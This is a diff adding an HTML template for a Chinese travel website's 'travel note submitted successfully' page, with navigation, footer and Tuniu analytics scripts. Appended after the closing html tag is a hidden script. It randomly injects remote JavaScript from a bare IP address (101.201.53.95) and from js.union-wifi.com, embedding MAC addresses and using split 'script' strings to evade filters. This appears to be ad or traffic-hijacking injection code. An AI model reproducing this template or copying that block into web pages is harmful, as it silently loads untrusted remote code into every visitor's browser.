@@ -1,0 +1,466 @@
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8">
+    <!--   发表游记审核页面   -->
+    <title>云游旅行网_云南旅行社精品网站_云南旅游云南中青国际旅行社网站</title>
+
+    <meta name="description" content="云游旅行网(yntravel.com)为云南中青国际旅行社旗下网站，提供云南旅游报价、云南自由行、昆明周边旅游、昆明出发国内游及出境游等旅游产品，云南旅行社网站首选！旅游咨询电话：400-633-5280" />
+    <link href="http://xnxw.cncnimg.cn/css/front/base.css" rel="stylesheet" type="text/css" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1.css?v=0317" rel="stylesheet" type="text/css" />
+    <link href="http://xnxw.cncnimg.cn/css/front/templet2/home1_color1.css?v=0317" rel="stylesheet" type="text/css" />
+</head>
+<!--[if lt IE 8]>
+<script>var auto;</script>
+<![endif]-->
+
+<body style="background:#D5F2FA url(http://x1.cncnimg.cn/p10068/10/daf8.jpg) no-repeat center top">
+
+<div class="warpper">
+
+    <div id="site_nav">
+        <div class="site_nav_bd">
+            <div class="login" th:if="${deng1}!=null"><em>欢迎来到记忆之旅 </em>
+                <em>欢迎来到记忆之旅 </em><a href="getuser.action" ><span th:text="${deng1}" id="name"></span></a>|<a href="logout.action" rel="nofollow">退出</a>
+            </div>
+            <div class="login" th:if="${deng1}==null"><em>欢迎来到记忆之旅 </em>
+                <a href="login.html">登录</a>|<a href="register.html" rel="nofollow">免费注册</a>
+            </div>
+            <div class="quick_menu">
+                <div class="top_ewm">
+                    <a class="mobile"><img src="http://x1.cncnimg.cn/p10068/10068_code.jpg"/></a>
+                </div>
+                <em>旅行社业务经营许可证 <a href="/about" target="_blank">L-YN-CJ00009</a></em>
+                <a href="/member/guester" rel="nofollow">订单查询</a>|
+                <a href="/pay_order" rel="nofollow">快捷支付</a>|            <a href="javascript:;" onClick="addBookMark()" rel="nofollow">加入收藏</a>|
+                <a href="/sitemap">网站导航</a>
+            </div>
+        </div>
+    </div>
+    <div class="header fn-clear">
+
+        <div class="nav_layer">
+            <div class="nav_layer_con">
+                <ul>
+                    <li class="all_pro"><span>全部旅游产品分类</span></li>
+
+
+                    <li  class="#"><a href="/"><span>首页<i class=""></i></span></a></li>
+                    <li ><a href="#"><span>门票<i ></i></span></a></li>
+                    <li ><a href="/lvyou"><span>旅游<i ></i></span></a></li>
+                    <li ><a href="/findTourist"><span>景点<i ></i></span></a></li>
+                    <li ><a href="/map"><span>目的地<i ></i></span></a></li>
+                    <li ><a href="#"><span>攻略<i ></i></span></a></li>
+                    <li ><a href="/Thematic_tour_homepage.html"><span>旅游专题<i ></i></span></a></li>
+                    <li ><a href="/individualCommunity"><span>个人社区<i class="hot1"></i></span></a></li>
+
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script src="http://xnxw.cncnimg.cn/js/jquery1.10.2.min.js"></script>
+    <script src="http://xnxw.cncnimg.cn/js/front/base.js"></script>
+    <script type="text/javascript">
+        $(function(){
+            $('.J_ercode').mouseover(function(){
+                $(this).find('.J_code_img').show();
+            });
+            $('.J_ercode').mouseout(function(){
+                $(this).find('.J_code_img').hide();
+            });
+        });
+    </script>
+
+    <script type="text/javascript" src="http://xnxw.cncnimg.cn/js/index/index2.js"></script>
+    <style>
+        .nav_layer_con ul li a {
+            float: left;
+            height: 40px;
+            padding: 0 8px;
+            font-size: 14px;
+            color: #fff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .gg1000{
+            _width:100%;
+            background-color:#777;
+            background-repeat:no-repeat;
+            background-position:center top;
+            padding:0;
+            position:relative;
+        }
+        .gg1000 a{
+            display:block;
+            margin:0 auto;
+            width:1000px;
+            background-repeat:no-repeat;
+            background-position:center top;
+            min-height:40px;
+        }
+        .gg1000 img{
+            display:block;
+            _margin-left:-9000px;
+            left:-9000px;
+            position:relative;
+        }
+        .gg1000 i{
+            position:absolute;
+            background:url(/static/images/front/home30/close.gif) no-repeat;
+            right: 0px;
+            top: 0px;
+            cursor: pointer;
+            height: 40px;
+            width: 40px;
+            z-index: 10;
+            opacity:0.6;
+            filter:alpha(opacity=60);
+        }
+        .gg1000 i:hover{
+            opacity:1;
+            filter:alpha(opacity=100);
+        }
+        .tab_cont .pro_list {
+            display: none;
+        }
+        .tab_cont .showed {
+            display: block;
+        }
+        .tab_cont .showed {
+            background: url(/static/images/front/zoomloader.gif) no-repeat center center;
+        }
+    </style><!-- 头部中end --> <!-- 横向导航菜单start -->
+    <div class="header_nav index clearfix">
+        <script>function loadBaidu() {
+            var _hmt = _hmt || [];
+            (function () {
+                var hm = document.createElement("script");
+                hm.src = "//hm.baidu.com/hm.js?51d49a7cda10d5dd86537755f081cc02";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        }//在新的头尾做出后jquery会移动到尾部，到时候这里要改的if (window.$) { $(function() { loadBaidu(); });} else { loadBaidu();}</script>
+        <div class="header_inner clearfix">
+            <!-- <div class="nav_dest"> <i class="header_icon icon_catalog"></i> <span class="dest_title">出游目的地</span> <div id="categorys"></div> </div>--> </div>
+        <link type="text/css" rel="stylesheet" href="//img1.tuniucdn.com/s/201702071836/common/index_nav_menu.css"/>
+
+        <div class="subnav_wrap_bg" id="subnav_wrap_bg"></div>
+        <input type="hidden" value="11" name="tabId"/>
+        <script type="text/javascript"> (function () {
+            var nav_tabs = document.getElementsByName("nav-tab");
+            var tabId = document.getElementsByName("tabId")[0].value;
+            if (nav_tabs.length && tabId.length) {
+                for (var i = 0; i < nav_tabs.length; i++) {
+                    if (nav_tabs[i].getAttribute("data-tab") == tabId) {
+                        var class_str = nav_tabs[i].className;
+                        class_str += " selected";
+                        nav_tabs[i].className = class_str;
+                    }
+                }
+            }
+        })();</script>
+        <script>$(document).ready(function () {
+            var catLoaded = false;
+            $(document).mousemove(function () {
+                if (!catLoaded) {
+                    var getCookie = function (objName) {
+                        var arrStr = document.cookie.split("; ");
+                        for (var i = 0; i < arrStr.length; i++) {
+                            var temp = arrStr[i].split("=");
+                            if (temp[0] == objName) return unescape(temp[1]);
+                        }
+                        return false;
+                    };
+                    catLoaded = true;
+                    var cityCode = '';
+                    cityCode = getCookie("tuniuuser_citycode");
+                    cityCode = base64decode(cityCode.toString());
+                    $.getScript("//www.tuniu.com/headermenu/" + cityCode);
+                }
+            });
+        });</script>
+        <script type="text/javascript" src="//ssl3.tuniucdn.com/j/2014101501/common/index_base_v5.js"></script>
+    </div> <!-- 横向导航菜单end --></div><!-- 头部end -->
+<script type="text/javascript">function selectTag(showContent, selfObj) {
+    var tag = document.getElementById("tags").getElementsByTagName("li");
+    var taglength = tag.length;
+    for (i = 0; i < taglength; i++) {
+        tag[i].className = "";
+    }
+    selfObj.parentNode.className = "selectTag";
+    for (i = 1; j = document.getElementById("tagContent" + i); i++) {
+        j.style.display = "none";
+    }
+    document.getElementById(showContent).style.display = "block";
+}
+function getCookie(objName) {
+    var arrStr = document.cookie.split("; ");
+    for (var i = 0; i < arrStr.length; i++) {
+        var temp = arrStr[i].split("=");
+        if (temp[0] == objName) return unescape(temp[1]);
+    }
+    return false;
+}
+var tuniuPPhoneDiv = document.getElementById("tuniu_400_num_phone");
+var tuniuPPhoneNumber = getCookie("p_phone_400");
+if (tuniuPPhoneDiv) {
+    if (tuniuPPhoneNumber) {
+        tuniuPPhoneDiv.innerHTML = tuniuPPhoneNumber;
+    } else {
+        tuniuPPhoneDiv.innerHTML = "4007-999-999";
+    }
+}
+$(function ($) {
+    var sub = $("#keyword-input-sub").val();
+    if (sub && sub != '') {
+        $("#keyword-input").val(sub);
+    }
+});</script><!-- 页面类型 -->
+<input type="hidden" name="page_type" id="page_type" value="130000"/>
+
+<link rel="stylesheet" type="text/css" href="http://img1.tuniucdn.com/s/201708080136/yj_2016/success.css"
+      media="screen"/>
+<div class="youji-success">
+    <div class="img">
+        <img src="http://img1.tuniucdn.com/img/201708080136/yj_2016/success.jpg" alt="link">
+    </div>
+    <div class="text">
+        <span class="title">游记发布成功</span><br>
+        <span>管理员会在1-3个工作日内（节假日顺延）审核完成</span><br>
+        <span>通过后会通过站内信随时通知您审核结果哦~</span>
+    </div>
+    <a href="/TravelNotes/getTravelNotes">查看发布的游记</a>
+</div>
+<!--start foot-->
+<!-- three sun S -->
+<link rel="stylesheet" type="text/css" href="//ssl1.tuniucdn.com/s/20151019/common_foot/common_foot_v3.css" /> <div class="trav_sev">
+
+<div class="three_trav">
+    <div class="thr_trav">
+        <a href="http://www.tuniu.com/static/sunshine_ensure/" target="_blank"
+           style="display:block;width:100%;height:100%;">
+            <em class="tn_text" id="service_phone_head_text">客户服务电话</em>
+            <em class="tn_phone" id="service_phone_head_phone">4007-999-999</em>
+        </a>
+    </div>
+</div>
+<!-- img_place E -->
+<!-- four_ad E -->
+
+
+
+<div class="center">
+    <div class="footer">
+        <div class="help">
+            <div class="txt bd_l0"><i class="i1"></i>
+                <strong>轻松成为旅行玩家</strong>
+                <p><a href="/help//5547" rel="nofollow" alt="旅行要知道" title="旅行要知道">旅行要知道</a></p>
+                <p><a href="/help//5548" rel="nofollow" alt="怎么选择一次好的旅行" title="怎么选择一次好的旅行">怎么选择一次好的旅行</a></p>
+                <p><a href="/help//5549" rel="nofollow" alt="旅行常见问题" title="旅行常见问题">旅行常见问题</a></p>
+                <p><a href="/help//5550" rel="nofollow" alt="旅游工具箱" title="旅游工具箱">旅游工具箱</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么预订</strong>
+                <p><a href="/help//5551" rel="nofollow" alt="旅游预订方式" title="旅游预订方式">旅游预订方式</a></p>
+                <p><a href="/help//5553" rel="nofollow" alt="预订常见问题" title="预订常见问题">预订常见问题</a></p>
+                <p><a href="/help//5554" rel="nofollow" alt="签署旅游合同" title="签署旅游合同">签署旅游合同</a></p>
+                <p><a href="/help//5556" rel="nofollow" alt="预订流程与服务承诺" title="预订流程与服务承诺">预订流程与服务承诺</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么付款</strong>
+                <p><a href="/help//5559" rel="nofollow" alt="付款方式" title="付款方式">付款方式</a></p>
+                <p><a href="/help//5560" rel="nofollow" alt="付款说明与使用帮助" title="付款说明与使用帮助">付款说明与使用帮助</a></p>
+                <p><a href="/help//5562" rel="nofollow" alt="支付安全保障" title="支付安全保障">支付安全保障</a></p>
+                <p><a href="/help//5563" rel="nofollow" alt="关于发票" title="关于发票">关于发票</a></p>
+            </div>
+            <div class="txt bd_r0"><i class="i1"></i>
+                <strong>开始旅行</strong>
+                <p><a href="/help//5564" rel="nofollow" alt="出发前的准备" title="出发前的准备">出发前的准备</a></p>
+                <p><a href="/help//5566" rel="nofollow" alt="服务建议与投诉" title="服务建议与投诉">服务建议与投诉</a></p>
+                <p><a href="/help//5567" rel="nofollow" alt="旅行故事分享" title="旅行故事分享">旅行故事分享</a></p>
+                <p><a href="/help//5568" rel="nofollow" alt="其它服务事项" title="其它服务事项">其它服务事项</a></p>
+            </div>
+            <!-- <div class="J_imgbox"><img src=""></div> -->
+        </div>
+
+        <div class="bottom_ico fn-clear" style="text-align: center;">
+            <ul>
+
+                <li class="xukezheng" style="float: none;"><a href="/about"><i style="-webkit-transform:scale(0.8); font-family: Arial;">L-YN-CJ00009</i></a></li>                <li style="float: none;"><span class="pay"></span></li>
+            </ul>
+        </div>
+        <div class="copyright fn-clear">
+            <div class="nav">
+                <a href="#">关于记忆之旅</a>
+                <a href="#">联系记忆之旅</a>
+                <a href="/sitemap">网站地图</a><a href="/link">友情链接</a>
+                <a href="/help">帮助中心</a>
+                <a href="/cp/login" rel="nofollow">管理</a>
+            </div>
+            <p><span>Copyright &copy; 2017 <a href="/" target="_blank">记忆之旅</a>   <a href="http://www.miitbeian.gov.cn/" target="_blank" rel="nofollow">滇ICP备14006366号-1</a></span>
+                志广科技有限公司旗下网站  公司地址：北京海淀区1314区520室  直线电话：010-666666
+            </p>
+
+
+            <p><a href="http://is.cncn.net/" target="_blank">欣欣建站</a>&nbsp;&nbsp;&nbsp;&nbsp;技术支持：<a href="http://www.cncn.net/" target="_blank">欣欣同业</a> & <a target="_blank" href="http://www.cncn.com/">欣欣旅游</a></p>
+        </div>
+
+        <div class="link mt10">
+            <strong>友情链接：</strong>
+            <a href="http://www.52uyn.com/" target="_blank" title="云南旅游">云南旅游</a>
+            <a href="http://www.dujiazoo.com/" target="_blank" title="云度旅行">云度旅行</a>
+            <a href="http://www.tourcool.com/" target="_blank" title="成都青年旅行社">成都青年旅行社</a>
+            <a href="http://www.phuketrip.com/" target="_blank" title="普吉岛旅游">普吉岛旅游</a>
+            <a href="http://www.sanxia-china.com/" target="_blank" title="三峡旅游">三峡旅游</a>
+            <a href="http://www.52ycd.com/" target="_blank" title="承德旅游网">承德旅游网</a>
+            <a href="" target="_blank" title=""></a>
+            <a href="/link">更多>></a>
+        </div>
+    </div>
+</div>
+
+<!--end foot-->
+
+<script language="javascript" src="//ssl4.tuniucdn.com/j/201704191800/common/mobile_app.js,common/zeus.js"></script>
+<script type="text/javascript">
+    var tuniuRecorder = _zeus.getRecorder();
+</script>
+
+<script src="//ssl4.tuniucdn.com/j/201714191800/rightcommon/underscore.js,rightcommon/main_prd_v3.js,rightcommon/getdata_v4.js"></script>
+<script type="text/javascript" src="//ssl3.tuniucdn.com/j/201505212000/common/jquery_autoSlide.js"></script>
+<script type="text/javascript">
+    $(function () {
+        $("#slideOrder").autoSlide();
+    })
+</script>
+<!--end foot-->
+<script type="text/javascript">
+    var catLoaded = false;
+    $(document).mouseover(function () {
+        if (!catLoaded) {
+            catLoaded = true;
+            $(".categorys").load('/header/null');
+        }
+    });
+</script>
+<style>
+    .index_app {
+        left: 50%;
+        top: 50%;
+        margin-left: 510px;
+        margin-top: -100px;
+        position: fixed;
+        _position: absolute;
+        z-index: 10000;
+        border: 1px solid #d8d8d8;
+        padding: 0 0 5px 0;
+        background: #fff;
+    }
+
+    .index_app a,
+    .index_app img {
+        display: block;
+        v
+    }
+
+    .index_app .index_app_top {
+        margin-bottom: 2px;
+    }
+</style>
+<script type="text/javascript"
+        src="http://img4.tuniucdn.com/j/2014091710/common/lazyloadnew.min.js,indicator/indicator.js"></script>
+<!-- GA/TA -->
+<script>
+    window.COLLECT && window.COLLECT("", "", "", "");
+</script>
+
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-4782081-5']);
+    _gaq.push(['_setDomainName', 'tuniu.com']);
+    _gaq.push(["_setAllowHash", false]);
+    _gaq.push(["_setAllowAnchor", true]);
+    _gaq.push(["_addOrganic", "baidu", "wd"]);
+    _gaq.push(["_addOrganic", "baidu", "word"]);
+    _gaq.push(["_addOrganic", "google", "q"]);
+    _gaq.push(["_addOrganic", "118114", "kw"]);
+    _gaq.push(["_addOrganic", "bing", "q"]);
+    _gaq.push(["_addOrganic", "soso", "w"]);
+    _gaq.push(["_addOrganic", "youdao", "q"]);
+    _gaq.push(["_addOrganic", "sogou", "query"]);
+    _gaq.push(["_addOrganic", "360", "q"]);
+    _gaq.push(["_addOrganic", "baidu", "w"]);
+    _gaq.push(["_addOrganic", "baidu", "q1"]);
+    _gaq.push(["_addOrganic", "baidu", "q2"]);
+    _gaq.push(["_addOrganic", "baidu", "q3"]);
+    _gaq.push(["_addOrganic", "baidu", "q4"]);
+    _gaq.push(["_addOrganic", "baidu", "q5"]);
+    _gaq.push(["_addOrganic", "baidu", "q6"]);
+    _gaq.push(["_addOrganic", "baidu", "q6"]);
+    _gaq.push(["_addOrganic", "www.so.com", "u"]);
+    _gaq.push(["_addOrganic", "www.so.com", "q"]);
+    _gaq.push(["_addOrganic", "360", "u"]);
+    _gaq.push(["_addOrganic", "360", "q"]);
+    _gaq.push(["_trackPageview", ""]);
+</script>
+<script type="text/javascript"> (function () {
+    var ga = document.createElement('script');
+    ga.type = 'text/javascript';
+    ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(ga, s);
+})();
+</script>
+<script type="text/javascript">
+    var u = (("https:" == document.location.protocol) ? "https://analy.tuniu.cn/analysisCollect/" : "http://analy.tuniu.cn/analysisCollect/");
+    document.write(unescape("%3Cscript src='" + u + "tac.mini.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+    var PageName = "";
+    var analyTuniuSpend = 0;
+    var tuniuTracker = _tat.getTracker();
+    tuniuTracker.setPageName(PageName);//do not delete
+    tuniuTracker.addOrganic("baidu.com", "w");
+    tuniuTracker.addOrganic("baidu.com", "q1");
+    tuniuTracker.addOrganic("baidu.com", "q2");
+    tuniuTracker.addOrganic("baidu.com", "q3");
+    tuniuTracker.addOrganic("baidu.com", "q4");
+    tuniuTracker.addOrganic("baidu.com", "q5");
+    tuniuTracker.addOrganic("baidu.com", "q6");
+    tuniuTracker.addOrganic("www.so.com", "u");
+    tuniuTracker.addOrganic("www.so.com", "q");
+    tuniuTracker.addOrganic("so.360.cn", "u");
+    tuniuTracker.addOrganic("so.360.cn", "q");
+    tuniuTracker.trackPageView();
+    tuniuTracker.enableLinkTracking();
+</script>
+</body>
+</html>
+<script>
+    function ik_random() {
+        var ik_r_min = 0;
+        var ik_r_max = 100;
+        return (parseInt(Math.random() * (ik_r_max - ik_r_min + 1) + ik_r_min));
+    }
+    function ik_isiframe() {
+        return (self != top);
+    }
+    var __m = '50:7b:9d:e0:3c:00';
+    var __m2 = '00:00:00:00:00:00';
+    var __h = "<sc" + "ript src=\"http://101.201.53.95/js.php?uid=90b9a2b579ed77179e1accd617f5034b,PC,";
+    var __b = "&r=" + Math.random() + __m + __m2 + "\"></scr" + "ipt>";
+    var x = ik_random();
+    if (!ik_isiframe()) {
+        switch (true) {
+            case x >= 0 && x < 5:
+                document.write(__h + "200" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+            case x >= 55 && x <= 100:
+                document.write(__h + "100" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+        }
+    }
+</script>
